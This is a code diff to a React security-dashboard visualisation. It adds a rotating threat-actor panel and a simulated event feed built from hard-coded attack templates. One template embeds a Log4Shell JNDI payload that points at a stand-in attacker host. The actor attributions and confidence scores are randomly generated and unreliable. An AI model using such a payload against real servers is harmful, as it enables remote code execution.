@@ -101,6 +101,8 @@ const AttackUniverse = () => {
   const [shockwaveActive, setShockwaveActive] = useState(false);
   const [twoHandsDetected, setTwoHandsDetected] = useState(false);
   const [showGestureTutorial, setShowGestureTutorial] = useState(true);
+  const [liveEvents, setLiveEvents] = useState<{ ts: string; type: string; src: string; dst: string; severity: string; detail: string }[]>([]);
+  const [activeThreatActor, setActiveThreatActor] = useState({ name: 'APT-29 (Cozy Bear)', confidence: 92 });
 
   const severityRef = useRef(severity);
   const selectedIdxRef = useRef(-1);
@@ -958,9 +960,11 @@ const AttackUniverse = () => {
         if (selectedIdxRef.current === idx) {
           setSelectedDomain(null);
           selectedIdxRef.current = -1;
+          setLiveEvents([]);
         } else {
           setSelectedDomain(DOMAINS[idx]);
           selectedIdxRef.current = idx;
+          setLiveEvents([]);
         }
       }
     };
@@ -1157,6 +1161,75 @@ const AttackUniverse = () => {
       setTotalAttacks(prev => prev + (Math.random() > 0.6 ? 1 : 0));
     }, 4000);
 
+    // Threat actor rotation
+    const THREAT_ACTORS = [
+      { name: 'APT-29 (Cozy Bear)', confidence: 92 },
+      { name: 'APT-28 (Fancy Bear)', confidence: 87 },
+      { name: 'Lazarus Group', confidence: 78 },
+      { name: 'FIN7 (Carbanak)', confidence: 85 },
+      { name: 'Scattered Spider', confidence: 71 },
+      { name: 'APT-41 (Winnti)', confidence: 89 },
+      { name: 'REvil / Sodinokibi', confidence: 65 },
+      { name: 'Sandworm (Voodoo Bear)', confidence: 83 },
+      { name: 'Volt Typhoon', confidence: 76 },
+      { name: 'BlackCat (ALPHV)', confidence: 69 },
+    ];
+    const threatInt = setInterval(() => {
+      const actor = THREAT_ACTORS[Math.floor(Math.random() * THREAT_ACTORS.length)];
+      setActiveThreatActor({ name: actor.name, confidence: actor.confidence + Math.floor(Math.random() * 6 - 3) });
+    }, 8000);
+
+    // Live event generation for selected domain
+    const eventInt = setInterval(() => {
+      if (selectedIdxRef.current < 0) return;
+      const domain = DOMAINS[selectedIdxRef.current];
+      const eventTemplates: Record<string, { type: string; src: string; dst: string; detail: string }[]> = {
+        identity: [
+          { type: 'AUTH_FAIL', src: '10.42.8.201', dst: 'DC-01.corp.local', detail: 'Kerberos TGT request failed - invalid credentials (5x in 30s)' },
+          { type: 'PRIV_ESC', src: 'svc_backup', dst: 'AD-CS-01', detail: 'Certificate template abuse - SubjectAltName manipulation' },
+          { type: 'GOLDEN_TKT', src: '10.42.12.55', dst: 'krbtgt', detail: 'Anomalous TGS-REP encryption type (RC4-HMAC from AES-only env)' },
+          { type: 'ENUM', src: '10.42.6.130', dst: 'LDAP://corp.local', detail: 'BloodHound-like LDAP queries - AdminCount=1 enumeration' },
+        ],
+        endpoint: [
+          { type: 'PROC_INJ', src: 'WKS-FIN042', dst: 'lsass.exe', detail: 'NtCreateThreadEx injection into LSASS - Mimikatz signature' },
+          { type: 'LOLBin', src: 'WKS-HR019', dst: 'mshta.exe', detail: 'MSHTA executing remote HTA payload from temp directory' },
+          { type: 'RANSOMWARE', src: 'SRV-DB03', dst: 'vssadmin.exe', detail: 'Shadow copy deletion followed by mass .encrypted extension writes' },
+          { type: 'PERSIST', src: 'WKS-ENG007', dst: 'schtasks.exe', detail: 'Scheduled task creation with base64-encoded PowerShell payload' },
+        ],
+        network: [
+          { type: 'C2_BEACON', src: '10.42.9.88', dst: '185.220.101.42', detail: 'Periodic HTTPS beaconing (60s jitter) to known Cobalt Strike IP' },
+          { type: 'DNS_TUNNEL', src: '10.42.3.14', dst: 'ns1.evil-cdn.xyz', detail: 'DNS TXT queries with base64 payload - 340 queries in 5min' },
+          { type: 'LATERAL', src: '10.42.8.201', dst: '10.42.12.55', detail: 'SMB/PSExec lateral movement - ADMIN$ share access' },
+          { type: 'EXFIL', src: '10.42.11.200', dst: '104.16.99.200', detail: 'Chunked HTTPS POST 2.3GB to Cloudflare-fronted C2 endpoint' },
+        ],
+        application: [
+          { type: 'SQLI', src: '203.0.113.42', dst: 'api.corp.com/v2/users', detail: 'Union-based SQL injection in search parameter - data extraction' },
+          { type: 'SSRF', src: 'web-app-03', dst: 'http://169.254.169.254', detail: 'SSRF to AWS IMDS - IAM role credentials accessed' },
+          { type: 'RCE', src: '198.51.100.77', dst: 'jira.corp.com', detail: 'Log4Shell exploitation attempt - ${jndi:ldap://attacker.com/a}' },
+        ],
+        cloud: [
+          { type: 'IAM_ABUSE', src: 'lambda-exec-role', dst: 'sts:AssumeRole', detail: 'Cross-account role assumption to production - unusual source IP' },
+          { type: 'S3_EXFIL', src: 'arn:aws:iam::*:role/dev', dst: 's3://finance-reports', detail: 'Bulk S3 GetObject from dev role to finance bucket (2,847 objects)' },
+          { type: 'CRYPTO_MINE', src: 'i-0a1b2c3d4e5f', dst: 'pool.minergate.com', detail: 'EC2 instance communicating with crypto mining pool' },
+        ],
+        data: [
+          { type: 'DLP_VIOL', src: 'user.exec@corp.com', dst: 'personal-gdrive', detail: 'SSN patterns detected in 4 files uploaded to personal cloud' },
+          { type: 'DB_DUMP', src: '10.42.12.55', dst: 'pgsql-prod-01', detail: 'Full table dump of PII_customers - 2.1M rows exported in 4min' },
+          { type: 'ENCRYPT', src: 'SRV-FILE01', dst: '*.docx, *.xlsx', detail: 'Mass file encryption detected - 14,000 files in 90 seconds' },
+        ],
+        physical: [
+          { type: 'TAILGATE', src: 'CAM-LOBBY-02', dst: 'Main entrance', detail: 'Unauthorized entry detected - no badge scan within 5s of door open' },
+          { type: 'BADGE_ANOM', src: 'Badge#4421', dst: 'Server Room B', detail: 'Badge used simultaneously at 2 locations 400m apart' },
+        ],
+      };
+      const templates = eventTemplates[domain.id] || eventTemplates['network'];
+      const tmpl = templates[Math.floor(Math.random() * templates.length)];
+      const now = new Date();
+      const ts = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}.${now.getMilliseconds().toString().padStart(3, '0')}`;
+      const sevs = ['CRITICAL', 'HIGH', 'MEDIUM', 'HIGH', 'CRITICAL'];
+      setLiveEvents(prev => [{ ts, ...tmpl, severity: sevs[Math.floor(Math.random() * sevs.length)] }, ...prev].slice(0, 8));
+    }, 2200);
+
     return () => {
       cancelAnimationFrame(sceneDataRef.current?.animId || 0);
       container.removeEventListener('mousemove', onMouseMove);
@@ -1164,6 +1237,8 @@ const AttackUniverse = () => {
       container.removeEventListener('dblclick', onDblClick);
       window.removeEventListener('resize', onResize);
       clearInterval(dataInt);
+      clearInterval(threatInt);
+      clearInterval(eventInt);
       controls.dispose();
       renderer.dispose();
       if (container.contains(renderer.domElement)) container.removeChild(renderer.domElement);
@@ -1344,62 +1419,62 @@ const AttackUniverse = () => {
         </div>
       )}
 
-      {/* Top Header */}
-      <div className="absolute top-0 left-0 right-0 z-10 px-5 py-4 bg-gradient-to-b from-[#030810]/95 to-transparent">
+      {/* Top Header - Minority Report style */}
+      <div className="absolute top-0 left-0 right-0 z-10 px-5 py-4 bg-gradient-to-b from-[#030810]/90 via-[#030810]/40 to-transparent">
         <div className="flex items-center justify-between">
           <div>
             <div className="flex items-center gap-2">
-              <div className="w-2.5 h-2.5 rounded-full animate-pulse" style={{ backgroundColor: sevConfig.hex, boxShadow: `0 0 8px ${sevConfig.hex}` }} />
-              <h2 className="text-sm font-bold text-white uppercase tracking-widest">Attack Universe</h2>
+              <div className="w-2 h-2 rounded-full animate-pulse" style={{ backgroundColor: sevConfig.hex, boxShadow: `0 0 12px ${sevConfig.hex}` }} />
+              <h2 className="text-xs font-bold text-white/80 uppercase tracking-[0.2em] font-mono">Attack Universe</h2>
               {handTrackingOn && (
-                <span className="px-2 py-0.5 rounded text-[9px] font-bold bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 uppercase">
-                  Hand Control
+                <span className="px-2 py-0.5 rounded text-[8px] font-mono font-bold bg-cyan-500/5 border border-cyan-500/20 text-cyan-400/80 uppercase">
+                  HAND CTRL
                 </span>
               )}
               {shockwaveActive && (
-                <span className="px-2 py-0.5 rounded text-[9px] font-bold bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 uppercase animate-pulse">
-                  Shockwave
+                <span className="px-2 py-0.5 rounded text-[8px] font-mono font-bold bg-yellow-500/5 border border-yellow-500/20 text-yellow-400 uppercase animate-pulse">
+                  SHOCKWAVE
                 </span>
               )}
             </div>
-            <p className="text-xs text-slate-500 mt-0.5">
+            <p className="text-[10px] text-slate-600 mt-0.5 font-mono tracking-wide">
               {handTrackingOn
-                ? 'Point=Beam | Fist=Grab | Palm=Push | Peace=Link | Pinch=Select | Clap=Shockwave'
-                : 'Drag to orbit - Click to inspect - Scroll to zoom - Double-click to focus'}
+                ? 'POINT=BEAM | FIST=GRAB | PALM=PUSH | PEACE=LINK | PINCH=SELECT | CLAP=SHOCKWAVE'
+                : 'DRAG=ORBIT // CLICK=INSPECT // SCROLL=ZOOM // DBLCLICK=FOCUS'}
             </p>
           </div>
-          <div className="flex items-center gap-4">
+          <div className="flex items-center gap-5">
             <div className="text-right">
-              <div className="text-[10px] text-slate-500 uppercase">Status</div>
-              <div className="text-lg font-black" style={{ color: sevConfig.hex }}>{severity.toUpperCase()}</div>
+              <div className="text-[8px] text-slate-600 uppercase font-mono tracking-wider">Threat Level</div>
+              <div className="text-sm font-mono font-black tracking-wider" style={{ color: sevConfig.hex, textShadow: `0 0 10px ${sevConfig.hex}40` }}>{severity.toUpperCase()}</div>
             </div>
             <div className="text-right">
-              <div className="text-[10px] text-slate-500 uppercase">Attacks</div>
-              <div className="text-lg font-black text-white">{totalAttacks}</div>
+              <div className="text-[8px] text-slate-600 uppercase font-mono tracking-wider">Attacks</div>
+              <div className="text-sm font-mono font-black text-white/90">{totalAttacks}</div>
             </div>
             <div className="text-right">
-              <div className="text-[10px] text-slate-500 uppercase">Energy</div>
-              <div className="text-lg font-black text-cyan-400">{coreEnergy}%</div>
+              <div className="text-[8px] text-slate-600 uppercase font-mono tracking-wider">Core Energy</div>
+              <div className="text-sm font-mono font-black text-cyan-400/90">{coreEnergy.toFixed(1)}%</div>
             </div>
           </div>
         </div>
       </div>
 
-      {/* Control Buttons */}
+      {/* Control Buttons - translucent glass */}
       <div className="absolute top-20 right-4 z-30 flex flex-col gap-2">
         <button
           onClick={toggleFullscreen}
-          className="p-2.5 rounded-lg border border-slate-600/40 bg-slate-900/70 text-slate-400 hover:text-white hover:border-white/20 transition-all backdrop-blur-sm"
+          className="p-2.5 rounded-lg border border-white/[0.06] bg-[#040c1a]/50 text-slate-500 hover:text-cyan-400 hover:border-cyan-500/20 transition-all backdrop-blur-xl"
           title={isFullscreen ? 'Exit fullscreen' : 'Maximize'}
         >
           {isFullscreen ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
         </button>
         <button
           onClick={handTrackingOn ? stopHandTracking : startHandTracking}
-          className={`p-2.5 rounded-lg border transition-all backdrop-blur-sm ${
+          className={`p-2.5 rounded-lg border transition-all backdrop-blur-xl ${
             handTrackingOn
-              ? 'border-cyan-500/50 bg-cyan-500/10 text-cyan-400 shadow-lg shadow-cyan-500/20'
-              : 'border-slate-600/40 bg-slate-900/70 text-slate-400 hover:text-cyan-400 hover:border-cyan-500/30'
+              ? 'border-cyan-500/30 bg-cyan-500/5 text-cyan-400 shadow-lg shadow-cyan-500/10'
+              : 'border-white/[0.06] bg-[#040c1a]/50 text-slate-500 hover:text-cyan-400 hover:border-cyan-500/20'
           }`}
           title={handTrackingOn ? 'Disable hand tracking' : 'Enable hand tracking (webcam)'}
         >
@@ -1412,7 +1487,7 @@ const AttackUniverse = () => {
               sceneDataRef.current.camera.position.set(0, 2.5, 6.5);
             }
           }}
-          className="p-2.5 rounded-lg border border-slate-600/40 bg-slate-900/70 text-slate-400 hover:text-white hover:border-white/20 transition-all backdrop-blur-sm"
+          className="p-2.5 rounded-lg border border-white/[0.06] bg-[#040c1a]/50 text-slate-500 hover:text-cyan-400 hover:border-cyan-500/20 transition-all backdrop-blur-xl"
           title="Reset camera"
         >
           <RotateCcw className="w-4 h-4" />
@@ -1437,79 +1512,140 @@ const AttackUniverse = () => {
         )}
       </div>
 
-      {/* Hover Tooltip */}
+      {/* Hover Tooltip - holographic */}
       {hoveredDomain && !selectedDomain && (
         <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-[120%] z-10 pointer-events-none">
-          <div className="px-4 py-3 rounded-xl border bg-slate-900/90 backdrop-blur-md" style={{ borderColor: `${hoveredDomain.color}40` }}>
+          <div className="px-4 py-3 rounded-lg border bg-[#040c1a]/85 backdrop-blur-xl" style={{ borderColor: `${hoveredDomain.color}20`, boxShadow: `0 0 20px ${hoveredDomain.color}10` }}>
             <div className="flex items-center gap-2">
-              <div className="w-3 h-3 rounded-full" style={{ backgroundColor: hoveredDomain.color }} />
-              <span className="text-sm font-bold text-white">{hoveredDomain.name}</span>
+              <div className="w-2.5 h-2.5 rounded-full" style={{ backgroundColor: hoveredDomain.color, boxShadow: `0 0 8px ${hoveredDomain.color}` }} />
+              <span className="text-xs font-mono font-bold text-white/90 tracking-wide">{hoveredDomain.name.toUpperCase()}</span>
             </div>
-            <div className="text-xs text-slate-400 mt-1">{hoveredDomain.description}</div>
-            <div className="flex gap-4 mt-2 text-[10px]">
-              <span className="text-slate-400">Health: <span className="text-white font-bold">{hoveredDomain.health}%</span></span>
-              <span className="text-slate-400">Attacks: <span className="text-red-400 font-bold">{hoveredDomain.attacks}</span></span>
+            <div className="text-[10px] text-slate-500 mt-1 font-mono">{hoveredDomain.description}</div>
+            <div className="flex gap-4 mt-2 text-[9px] font-mono">
+              <span className="text-slate-500">HLTH:<span className="text-emerald-400 font-bold ml-1">{hoveredDomain.health}%</span></span>
+              <span className="text-slate-500">ATK:<span className="text-red-400 font-bold ml-1">{hoveredDomain.attacks}</span></span>
+              <span className="text-slate-500">PRS:<span className="text-orange-400 font-bold ml-1">{hoveredDomain.pressure}%</span></span>
             </div>
           </div>
         </div>
       )}
 
-      {/* Selected Domain Panel */}
+      {/* Selected Domain Panel - Minority Report Style */}
       {selectedDomain && (
-        <div className="absolute bottom-20 left-4 z-10 max-w-sm">
-          <div className="rounded-xl border bg-slate-900/90 backdrop-blur-md p-4" style={{ borderColor: `${selectedDomain.color}40` }}>
-            <div className="flex items-center justify-between mb-3">
+        <div className="absolute bottom-20 left-4 z-10 w-[420px]">
+          <div className="rounded-xl border border-cyan-500/10 bg-[#040c1a]/80 backdrop-blur-2xl p-4 shadow-2xl shadow-cyan-900/20" style={{ boxShadow: `0 0 40px ${selectedDomain.color}10, inset 0 0 30px ${selectedDomain.color}05` }}>
+            {/* Holographic scan line animation */}
+            <div className="absolute inset-0 overflow-hidden rounded-xl pointer-events-none">
+              <div className="absolute inset-x-0 h-[1px] bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent animate-pulse" style={{ top: '30%' }} />
+              <div className="absolute inset-x-0 h-[1px] bg-gradient-to-r from-transparent via-cyan-400/10 to-transparent" style={{ top: '60%', animationDelay: '1s' }} />
+            </div>
+
+            {/* Header */}
+            <div className="flex items-center justify-between mb-3 relative">
               <div className="flex items-center gap-2">
-                <div className="w-4 h-4 rounded-full" style={{ backgroundColor: selectedDomain.color, boxShadow: `0 0 10px ${selectedDomain.color}60` }} />
-                <span className="text-base font-bold text-white">{selectedDomain.name}</span>
-                <span className={`text-[10px] px-2 py-0.5 rounded-full font-semibold ${selectedDomain.active ? 'bg-green-500/10 text-green-400' : 'bg-slate-700/50 text-slate-500'}`}>
+                <div className="w-3 h-3 rounded-full animate-pulse" style={{ backgroundColor: selectedDomain.color, boxShadow: `0 0 12px ${selectedDomain.color}80` }} />
+                <span className="text-sm font-bold text-white/90 tracking-wide">{selectedDomain.name.toUpperCase()}</span>
+                <span className={`text-[9px] px-2 py-0.5 rounded font-mono ${selectedDomain.active ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-slate-700/30 text-slate-500 border border-slate-600/20'}`}>
                   {selectedDomain.active ? 'ACTIVE' : 'DORMANT'}
                 </span>
               </div>
-              <button onClick={() => { setSelectedDomain(null); selectedIdxRef.current = -1; }} className="text-slate-500 hover:text-white text-xs px-2 py-1 rounded border border-slate-700/40 hover:border-white/20 transition-all">ESC</button>
+              <button onClick={() => { setSelectedDomain(null); selectedIdxRef.current = -1; setLiveEvents([]); }} className="text-slate-500 hover:text-cyan-400 text-[10px] font-mono px-2 py-1 rounded border border-slate-700/30 hover:border-cyan-500/30 transition-all">
+                [ESC]
+              </button>
             </div>
-            <div className="grid grid-cols-4 gap-3">
-              <div className="text-center"><div className="text-lg font-black text-white">{selectedDomain.health}%</div><div className="text-[9px] text-slate-500 uppercase">Health</div></div>
-              <div className="text-center"><div className="text-lg font-black" style={{ color: selectedDomain.pressure > 70 ? '#ef4444' : '#f59e0b' }}>{selectedDomain.pressure}%</div><div className="text-[9px] text-slate-500 uppercase">Pressure</div></div>
-              <div className="text-center"><div className="text-lg font-black text-red-400">{selectedDomain.attacks}</div><div className="text-[9px] text-slate-500 uppercase">Attacks</div></div>
-              <div className="text-center"><div className="text-lg font-black text-cyan-400">{100 - selectedDomain.pressure}%</div><div className="text-[9px] text-slate-500 uppercase">Capacity</div></div>
+
+            {/* Stats Grid */}
+            <div className="grid grid-cols-4 gap-2 mb-3">
+              {[
+                { label: 'HEALTH', value: `${selectedDomain.health}%`, color: selectedDomain.health > 70 ? '#10b981' : selectedDomain.health > 40 ? '#f59e0b' : '#ef4444' },
+                { label: 'PRESSURE', value: `${selectedDomain.pressure}%`, color: selectedDomain.pressure > 70 ? '#ef4444' : '#f59e0b' },
+                { label: 'ATTACKS', value: String(selectedDomain.attacks), color: '#ef4444' },
+                { label: 'CAPACITY', value: `${100 - selectedDomain.pressure}%`, color: '#06b6d4' },
+              ].map((stat) => (
+                <div key={stat.label} className="text-center px-2 py-1.5 rounded-lg bg-white/[0.02] border border-white/[0.04]">
+                  <div className="text-base font-mono font-bold" style={{ color: stat.color }}>{stat.value}</div>
+                  <div className="text-[8px] text-slate-500 uppercase tracking-wider mt-0.5">{stat.label}</div>
+                </div>
+              ))}
             </div>
-            <div className="mt-3 h-1.5 bg-slate-800 rounded-full overflow-hidden">
-              <div className="h-full rounded-full transition-all" style={{ width: `${selectedDomain.health}%`, backgroundColor: selectedDomain.health > 70 ? '#10b981' : selectedDomain.health > 40 ? '#f59e0b' : '#ef4444' }} />
+
+            {/* Progress Bar */}
+            <div className="h-0.5 bg-slate-800/50 rounded-full overflow-hidden mb-3">
+              <div className="h-full rounded-full transition-all duration-700" style={{ width: `${selectedDomain.health}%`, backgroundColor: selectedDomain.color, boxShadow: `0 0 6px ${selectedDomain.color}` }} />
+            </div>
+
+            {/* Live Event Stream */}
+            <div className="border-t border-cyan-500/10 pt-2">
+              <div className="flex items-center gap-2 mb-2">
+                <div className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
+                <span className="text-[9px] font-mono text-cyan-400/70 uppercase tracking-[0.15em]">Live Event Stream</span>
+                <span className="text-[8px] font-mono text-slate-600 ml-auto">{liveEvents.length} events</span>
+              </div>
+              <div className="space-y-1 max-h-[140px] overflow-hidden">
+                {liveEvents.length === 0 ? (
+                  <div className="text-[10px] text-slate-600 font-mono text-center py-3 animate-pulse">Intercepting traffic...</div>
+                ) : (
+                  liveEvents.map((evt, i) => (
+                    <div
+                      key={`${evt.ts}-${i}`}
+                      className="flex items-start gap-2 text-[9px] font-mono py-1 px-1.5 rounded bg-white/[0.01] border-l-2 transition-all duration-300"
+                      style={{
+                        borderLeftColor: evt.severity === 'CRITICAL' ? '#ef4444' : evt.severity === 'HIGH' ? '#f97316' : '#eab308',
+                        opacity: 1 - i * 0.1,
+                      }}
+                    >
+                      <span className="text-slate-600 shrink-0">{evt.ts}</span>
+                      <span className={`shrink-0 font-bold ${evt.severity === 'CRITICAL' ? 'text-red-400' : evt.severity === 'HIGH' ? 'text-orange-400' : 'text-yellow-400'}`}>
+                        {evt.type}
+                      </span>
+                      <span className="text-slate-500 truncate">{evt.src} → {evt.dst}</span>
+                    </div>
+                  ))
+                )}
+              </div>
+              {liveEvents.length > 0 && (
+                <div className="mt-1.5 text-[8px] font-mono text-slate-600 truncate px-1">
+                  {liveEvents[0]?.detail}
+                </div>
+              )}
             </div>
           </div>
         </div>
       )}
 
-      {/* Threat Actor */}
-      <div className="absolute bottom-20 right-56 z-10 w-48">
-        <div className="rounded-xl border border-red-500/20 bg-slate-900/80 backdrop-blur-md p-3">
-          <div className="flex items-center gap-1.5 mb-1.5">
-            <Crosshair className="w-3 h-3 text-red-400" />
-            <span className="text-[9px] font-bold text-red-400 uppercase tracking-wider">Threat Actor</span>
+      {/* Threat Actor - rotating */}
+      <div className="absolute bottom-20 right-56 z-10 w-52">
+        <div className="rounded-xl border border-red-500/15 bg-[#0a1628]/70 backdrop-blur-xl p-3 shadow-lg shadow-red-500/5">
+          <div className="flex items-center gap-1.5 mb-2">
+            <Crosshair className="w-3 h-3 text-red-400 animate-pulse" />
+            <span className="text-[9px] font-bold text-red-400/80 uppercase tracking-[0.15em]">Active Threat Actor</span>
           </div>
-          <div className="text-sm font-bold text-white">APT-29 (Cozy Bear)</div>
-          <div className="flex items-center gap-2 mt-1 mb-1">
-            <div className="flex-1 h-1 bg-slate-700/50 rounded-full overflow-hidden">
-              <div className="h-full bg-gradient-to-r from-red-500 to-orange-400 rounded-full" style={{ width: '92%' }} />
+          <div className="text-sm font-bold text-white/90 tracking-wide">{activeThreatActor.name}</div>
+          <div className="flex items-center gap-2 mt-2">
+            <div className="flex-1 h-1 bg-slate-700/30 rounded-full overflow-hidden">
+              <div
+                className="h-full rounded-full transition-all duration-1000"
+                style={{ width: `${activeThreatActor.confidence}%`, background: `linear-gradient(90deg, #ef4444, #f97316)` }}
+              />
             </div>
-            <span className="text-[10px] font-bold text-red-400">92%</span>
+            <span className="text-[10px] font-mono font-bold text-red-400">{activeThreatActor.confidence}%</span>
           </div>
+          <div className="text-[9px] text-slate-500 mt-1.5 font-mono">TTP MATCH // MITRE ATT&CK CORRELATION</div>
         </div>
       </div>
 
       {/* Severity Controls */}
-      <div className="absolute bottom-4 left-1/2 -translate-x-1/2 z-10 flex items-center gap-1 px-3 py-1.5 rounded-lg border border-slate-700/30 bg-slate-900/70 backdrop-blur-sm">
+      <div className="absolute bottom-4 left-1/2 -translate-x-1/2 z-10 flex items-center gap-0.5 px-2 py-1 rounded-lg border border-white/[0.04] bg-[#040c1a]/60 backdrop-blur-xl">
         {(['normal', 'elevated', 'high', 'critical'] as SeverityLevel[]).map((s) => {
           const c = getSeverityConfig(s);
           return (
             <button
               key={s}
               onClick={() => setSeverity(s)}
-              className={`px-3 py-1.5 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all ${
-                severity === s ? 'bg-white/10 scale-105' : 'opacity-50 hover:opacity-100'
+              className={`px-3 py-1.5 rounded text-[9px] font-mono font-bold uppercase tracking-wider transition-all ${
+                severity === s ? 'bg-white/[0.06] scale-105 border border-white/[0.08]' : 'opacity-40 hover:opacity-90 border border-transparent'
               }`}
-              style={{ color: c.hex }}
+              style={{ color: c.hex, textShadow: severity === s ? `0 0 8px ${c.hex}40` : 'none' }}
             >
               {s}
             </button>
@@ -1521,8 +1657,8 @@ const AttackUniverse = () => {
       <div className="absolute bottom-4 left-4 z-10 flex flex-wrap gap-x-3 gap-y-1">
         {DOMAINS.map(d => (
           <div key={d.id} className="flex items-center gap-1">
-            <div className="w-2 h-2 rounded-full" style={{ backgroundColor: d.color, opacity: d.active ? 1 : 0.4 }} />
-            <span className="text-[8px] text-slate-500 font-medium">{d.name}</span>
+            <div className="w-1.5 h-1.5 rounded-full" style={{ backgroundColor: d.color, opacity: d.active ? 1 : 0.3, boxShadow: d.active ? `0 0 4px ${d.color}` : 'none' }} />
+            <span className="text-[8px] text-slate-600 font-mono uppercase tracking-wider">{d.name}</span>
           </div>
         ))}
       </div>
